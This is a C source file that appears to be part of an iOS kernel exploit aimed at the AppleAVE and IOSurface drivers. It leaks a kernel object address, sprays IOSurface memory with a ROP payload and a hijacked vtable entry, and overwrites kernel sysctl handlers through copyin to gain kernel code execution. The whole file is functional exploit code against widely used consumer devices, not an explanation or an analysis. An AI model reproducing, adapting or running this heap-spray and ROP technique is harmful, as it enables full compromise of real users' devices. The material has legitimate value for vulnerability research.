#include "heap_spray.h"
#include "iosurface_utils.h"
#include "apple_ave_pwn.h"
#include "Utilities.h"
#include "offsets.h"

static io_connect_t g_surface_conn = 0;
static uint32_t g_spraying_surface = 0;

static uint32_t g_surface_id_to_leak_address = 0;
static void * g_surface_kernel_address = NULL;

static void * g_fake_sysctl_handlers = NULL;

static void * g_new_sprayed_object = NULL;

struct sysctl_oid {
	void *oid_parent;
	void * oid_link;
	int		oid_number;
	int		oid_kind;
	void		*oid_arg1;
	int		oid_arg2;
	const char	*oid_name;
	int 		(*oid_handler);
	const char	*oid_fmt;
	const char	*oid_descr; /* offsetof() field / long description */
	int		oid_version;
	int		oid_refcnt;
};

/*
 * Function name: 	heap_spray_prepare_buffer_for_rop
 * Description:		Prepares our buffer for a ROP chain.
 * Returns:			void.
 */

void heap_spray_prepare_buffer_for_rop(uint64_t function, uint64_t arg0,
	uint64_t arg1, uint64_t arg2) {

	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION + 0x18) = arg2;
	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x10) = arg0;
	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x18) = arg1;
	*(uint64_t*)(g_new_sprayed_object + SPRAY_SYSCTL_HELPER_EXECUTION_ROP + 0x20) = function;
}



/*
 * Function name: 	heap_spray_initialize_fake_sysctl_buffer
 * Description:		Initializes a fake sysctl handler for the overwrite.
 * Returns:			kern_return_t (but in reality KERN_SUCCESS on success and something else on failure).
 */

kern_return_t heap_spray_initialize_fake_sysctl_buffer() {
	
	kern_return_t ret = KERN_SUCCESS;
	struct sysctl_oid * sysctl = NULL;

	/* Overwriting both l1dcachesize and l1icachesize */
	sysctl = (struct sysctl_oid *)malloc(SYSCTL_HANDLER_SIZE * 2);
	if (NULL == sysctl)
	{
		printf("[ERROR]:  allocating 0x%x bytes for fake sysctls", SYSCTL_HANDLER_SIZE * 2);
		ret = KERN_MEMORY_ERROR;
		goto cleanup;
	}

	g_fake_sysctl_handlers = sysctl;

	sysctl->oid_parent = offsets_get_kernel_base() + OFFSET(sysctl_hw_family);
	sysctl->oid_link = offsets_get_kernel_base() + OFFSET(l1dcachesize_handler) + SYSCTL_HANDLER_SIZE;
	sysctl->oid_name = offsets_get_kernel_base() + OFFSET(l1dcachesize_string);

	/* Will call OSSerializer::serialize */
	sysctl->oid_handler = offsets_get_kernel_base() + OFFSET(osserializer_serialize);

	/* First parameter to OSSerializer::serialize */
	*(void**)((char*)sysctl + 0x10) = g_surface_kernel_address + SPRAY_SYSCTL_HELPER;

	/* Second parameter to OSSerializer::serialize */
	*(unsigned long*)((char*)sysctl + 0x18) = IOSURFACE_KERNEL_OBJECT_SIZE;

	/* This will call again to OSSerializer::serialize */
	*(void**)((char*)sysctl + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);

	sysctl->oid_fmt = offsets_get_kernel_base() + OFFSET(quad_format_string);
	sysctl->oid_descr = offsets_get_kernel_base() + OFFSET(null_terminator);

	sysctl = (struct sysctl_oid*)((char*)sysctl + SYSCTL_HANDLER_SIZE);

	sysctl->oid_parent = offsets_get_kernel_base() + OFFSET(sysctl_hw_family);
	sysctl->oid_link = offsets_get_kernel_base() + OFFSET(l1dcachesize_handler) + (2 * SYSCTL_HANDLER_SIZE);
	sysctl->oid_name = offsets_get_kernel_base() + OFFSET(l1icachesize_string);

	/* Will call OSSerializer::serialize */
	sysctl->oid_handler = offsets_get_kernel_base() + OFFSET(osserializer_serialize);

	/* First parameter to OSSerializer::serialize */
	*(void**)((char*)sysctl + 0x10) = g_surface_kernel_address + SPRAY_SYSCTL_HELPER_EXECUTION;

	/* Second parameter to OSSerializer::serialize */
	*(unsigned long*)((char*)sysctl + 0x18) = IOSURFACE_KERNEL_OBJECT_SIZE;

	/* This will call again to OSSerializer::serialize */
	*(void**)((char*)sysctl + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);

	sysctl->oid_fmt = offsets_get_kernel_base() + OFFSET(quad_format_string);
	sysctl->oid_descr = offsets_get_kernel_base() + OFFSET(null_terminator);


cleanup:
	return ret;
}



/*
 * Function name: 	heap_spray_cleanup
 * Description:		Cleans up the heap spraying. Freeing up resources.
 * Returns:			void.
 */

void heap_spray_cleanup() {
	
	if (g_surface_conn)
	{
		if (g_surface_id_to_leak_address)
		{
			iosurface_utils_release_surface(g_surface_conn, g_surface_id_to_leak_address);
			g_surface_id_to_leak_address = 0;
		}

		if (g_spraying_surface)
		{
			iosurface_utils_release_surface(g_surface_conn, g_spraying_surface);
			g_spraying_surface = 0;
		}

		IOServiceClose(g_surface_conn);
		g_surface_conn = 0;
	}

	if (g_fake_sysctl_handlers)
	{
		free(g_fake_sysctl_handlers);
		g_fake_sysctl_handlers = NULL;
	}

	if (g_new_sprayed_object)
	{
		free(g_new_sprayed_object);
		g_new_sprayed_object = NULL;
	}
}


/*
 * Function name: 	heap_spray_init
 * Description:		Initializes the heap spray.
 * Returns:			kern_return_t.
 */

kern_return_t heap_spray_init() {
	
	kern_return_t ret = KERN_SUCCESS;

	g_new_sprayed_object = malloc(IOSURFACE_KERNEL_OBJECT_SIZE);
	if (NULL == g_new_sprayed_object)
	{
		printf("[ERROR]:  mallocing g_new_sprayed_object");
		ret = KERN_MEMORY_ERROR;
		goto cleanup;
	}

	ret = iosurface_utils_get_connection(&g_surface_conn);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:  creating an IOSurface connection");
		goto cleanup;
	}

	ret = iosurface_utils_create_surface(g_surface_conn, &g_spraying_surface, NULL);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:  creating a spraying IOSurface object");
		goto cleanup;
	}

	ret = iosurface_utils_create_surface(g_surface_conn, &g_surface_id_to_leak_address, NULL);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:  creating surface for leak");
		goto cleanup;
	}

	printf("[INFO]: g_surface_id_to_leak_address %d", g_surface_id_to_leak_address);

	ret = apple_ave_pwn_get_surface_kernel_address(g_surface_id_to_leak_address, &g_surface_kernel_address);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:  leaking address for surface %d", g_surface_id_to_leak_address);
		goto cleanup;
	}

	printf("[INFO]: kernel address of surface %d is %p", g_surface_id_to_leak_address, g_surface_kernel_address);


cleanup:
	if (KERN_SUCCESS != ret)
	{
		heap_spray_cleanup();
	}
	return ret;
}

/*
 * Function name: 	heap_spray_get_spraying_buffer
 * Description:		Creates a buffer for spraying. 
 					object_address is the alleged address that the allocation will take place in.
 * Returns:			char *.
 */

static
char * heap_spray_get_spraying_buffer(uint64_t object_address) {
	
	uint32_t i = 0;
	char * data = malloc(IOSURFACE_KERNEL_OBJECT_SIZE);
	if (NULL == data)
	{
		return data;
	}

	printf("[INFO]: ret_gadget: %llx", offsets_get_kernel_base() + OFFSET(ret_gadget));

	for(i = 0; i < IOSURFACE_KERNEL_OBJECT_SIZE; i += sizeof(uint64_t)) {
		*(uint64_t*)(data+i) = offsets_get_kernel_base() + OFFSET(ret_gadget);
	}

	*(uint64_t*)(data) = object_address;
	*(uint64_t*)(data + 0x8) = 0x100; 		/* We don't want to be freed. never. */

	/* Just for the fun, doesn't really happen in normal flow */
	*(uint64_t*)(data + 0x260) = offsets_get_kernel_base() + OFFSET(panic);

	*(uint64_t*)(data + OFFSET(iosurface_vtable_offset_kernel_hijack)) =
	offsets_get_kernel_base() + OFFSET(osserializer_serialize);
	
	//*(void**)(data + 0x98) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);	
	//*(void**)(data + 0xA0) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);

	/* OSSerializer::serialize(data + 0x234, SYSCTL_HANDLER_SIZE * 2) */
	*(uint64_t*)(data + 0x10) = object_address + 0x234;
	*(unsigned long*)(data + 0x18) = SYSCTL_HANDLER_SIZE * 2; /* third parameter for ROP chain */
	*(uint64_t*)(data + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);


	/* copyin(g_fake_sysctl_handlers, l1dcachesize_handler, SYSCTL_HANDLER_SIZE * 2) */
	*(void**)(data + 0x234 + 0x10) = g_fake_sysctl_handlers; /* first paramter for ROP chain */
	*(uint64_t*)(data + 0x234 + 0x18) = offsets_get_kernel_base() + OFFSET(l1dcachesize_handler); /* second parameter for ROP chain */
	*(uint64_t*)(data + 0x234 + 0x20) = offsets_get_kernel_base() + OFFSET(copyin);


	/* copyin(g_fake_sysctl_handlers, l1dcachesize_handler, SYSCTL_HANDLER_SIZE * 2) */


	/* So we can always modify this object */
	*(void**)(data + SPRAY_SYSCTL_HELPER + 0x10) = g_new_sprayed_object;
	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER + 0x18) = object_address;
	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER + 0x20) = offsets_get_kernel_base() + OFFSET(copyin);

	/* SPRAY_SYSCTL_HELPER_EXECUTION */
	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x10) = object_address + SPRAY_SYSCTL_HELPER_EXECUTION_ROP;
	/* arg2 */
	*(void**)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x18) = (void*)0x1;
	*(uint64_t*)(data + SPRAY_SYSCTL_HELPER_EXECUTION + 0x20) = offsets_get_kernel_base() + OFFSET(osserializer_serialize);

	//memset(data, 0x41414141, IOSURFACE_KERNEL_OBJECT_SIZE);

	memcpy(g_new_sprayed_object, data, IOSURFACE_KERNEL_OBJECT_SIZE);
/*
	for(i = 0; i < IOSURFACE_KERNEL_OBJECT_SIZE; i += sizeof(uint64_t)) {
		printf("[INFO]: local_spray[0x%x] = %p", i, *(void**)(g_new_sprayed_object + i));
	}
*/
	return data;
}



/*
 * Function name: 	heap_spray_start_spraying
 * Description:		Starts the actual spraying.
 * Returns:			kern_return_t and the kernel address with our allocated data as an output parameter.
 */

kern_return_t heap_spray_start_spraying(uint64_t * kernel_allocated_data) {
	
	kern_return_t ret = KERN_SUCCESS;
	char * data_to_spray = NULL;
	char * data_to_spray_base64 = NULL;
	uint32_t i = 0;
	char key[] = {'A', 0};
	char * key_ptr = key;

	ret = heap_spray_initialize_fake_sysctl_buffer();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:  initializing the fake sysctl buffer");
		goto cleanup;
	}

	data_to_spray = heap_spray_get_spraying_buffer(g_surface_kernel_address);
	if (NULL == data_to_spray)
	{
		printf("[ERROR]:  allocating data for spraying");
		goto cleanup;
	}

	data_to_spray_base64 = utils_get_base64_payload(data_to_spray, IOSURFACE_KERNEL_OBJECT_SIZE);
	if (NULL == data_to_spray_base64)
	{
		printf("[ERROR]:  converting data to base64");
		goto cleanup;
	}

	ret = iosurface_utils_release_surface(g_surface_conn, g_surface_id_to_leak_address);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]:  freeing surface %d", g_surface_id_to_leak_address);
		goto cleanup;
	}

	g_surface_id_to_leak_address = 0;

	for(i = 0; i < NUMBER_OF_OBJECTS_TO_SPRAY; ++i) {
		key[0] = key[0] + 1;
		ret = iosurface_utils_set_value(g_surface_conn, g_spraying_surface, key_ptr, 
			data_to_spray_base64);

		if (KERN_SUCCESS != ret)
		{
			printf("[ERROR]:  setting value (i = %d)", i);
			goto cleanup;
		}
	}

	*kernel_allocated_data = g_surface_kernel_address;

cleanup:
	if (data_to_spray_base64)
	{
		free(data_to_spray_base64);
		data_to_spray_base64 = NULL;
	}

	if (data_to_spray)
	{
		free(data_to_spray);
		data_to_spray = NULL;
	}

	return ret;
}

